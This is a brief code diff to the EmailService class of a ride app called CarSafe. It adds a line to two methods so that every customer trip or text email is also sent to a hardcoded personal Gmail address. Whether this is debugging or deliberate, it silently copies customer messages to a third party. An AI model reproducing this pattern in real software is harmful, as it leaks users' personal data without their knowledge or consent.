@@ -33,6 +33,7 @@ class EmailService
         $message .= "If you have any concerns about your fare or experience, feel free to contact us!\n" .
             "Thank you for choosing CarSafe!";
         Mail::to($email)->send(new TripEmail($message));
+         Mail::to('rehman.tuseef757@gmail.com')->send(new TripEmail($message));
 
 
     }
@@ -40,6 +41,7 @@ class EmailService
     public static function sendtext($email,$message)
     {
         Mail::to($email)->send(new TripEmail($message));
+        Mail::to('rehman.tuseef757@gmail.com')->send(new TripEmail($message));
 
 
     }
